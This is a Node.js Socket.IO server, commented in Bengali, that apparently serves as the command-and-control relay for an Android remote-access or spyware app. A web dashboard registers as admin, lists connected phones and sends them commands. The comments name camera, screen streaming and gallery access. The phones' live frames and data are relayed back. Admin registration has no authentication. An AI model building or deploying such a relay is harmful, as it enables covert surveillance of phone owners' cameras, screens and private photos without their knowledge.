const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const cors = require('cors');

const app = express();
app.use(cors());

const server = http.createServer(app);
const io = socketIo(server, {
    origins: '*:*'
});

// কানেকশন ট্র্যাক করার জন্য
let adminSocketId = null;
let connectedDevices = {};

io.on('connection', (socket) => {
    console.log(`New connection: ${socket.id}`);

    // ১. যখন ওয়েব ড্যাশবোর্ড অ্যাডমিন হিসেবে কানেক্ট হবে
    socket.on('register_admin', () => {
        adminSocketId = socket.id;
        console.log(`Admin Connected: ${adminSocketId}`);
        // বর্তমান অনলাইন ডিভাইসগুলোর তালিকা অ্যাডমিনকে পাঠানো
        socket.emit('device_list', Object.keys(connectedDevices));
    });

    // ২. যখন অ্যান্ড্রয়েড অ্যাপ ডিভাইস হিসেবে রেজিস্টার করবে
    socket.on('register_device', (data) => {
        const deviceId = data.deviceId || socket.id;
        connectedDevices[deviceId] = socket.id;
        console.log(`Android Device Registered: ${deviceId}`);

        // যদি অ্যাডমিন অনলাইনে থাকে, তাকে নতুন ডিভাইসের তথ্য জানানো
        if (adminSocketId) {
            io.to(adminSocketId).emit('device_list', Object.keys(connectedDevices));
        }
    });

    // ৩. ড্যাশবোর্ড থেকে কোনো কমান্ড (যেমন: ক্যামেরা, স্ক্রিন স্ট্রিম বা গ্যালারি) আসলে তা নির্দিষ্ট ডিভাইসে পাঠানো
    socket.on('send_command', (data) => {
        const { targetDeviceId, command, payload } = data;
        const deviceSocketId = connectedDevices[targetDeviceId];

        if (deviceSocketId) {
            io.to(deviceSocketId).emit('execute_command', { command, payload });
            console.log(`Command '${command}' sent to device ${targetDeviceId}`);
        } else {
            console.log(`Target device ${targetDeviceId} not found!`);
        }
    });

    // ৪. অ্যান্ড্রয়েড অ্যাপ থেকে রেসপন্স বা লাইভ ফ্রেম আসলে তা ড্যাশবোর্ডে পাঠানো
    socket.on('device_response', (data) => {
        if (adminSocketId) {
            io.to(adminSocketId).emit('admin_receive_data', data);
        }
    });

    // ডিসকানেক্ট হ্যান্ডেল করা
    socket.on('disconnect', () => {
        console.log(`Disconnected: ${socket.id}`);
        if (socket.id === adminSocketId) {
            adminSocketId = null;
            console.log('Admin Disconnected');
        } else {
            // ডিভাইস লিস্ট থেকে রিমুভ করা
            for (let [deviceId, sId] of Object.entries(connectedDevices)) {
                if (sId === socket.id) {
                    delete connectedDevices[deviceId];
                    console.log(`Device Disconnected: ${deviceId}`);
                    if (adminSocketId) {
                        io.to(adminSocketId).emit('device_list', Object.keys(connectedDevices));
                    }
                    break;
                }
            }
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});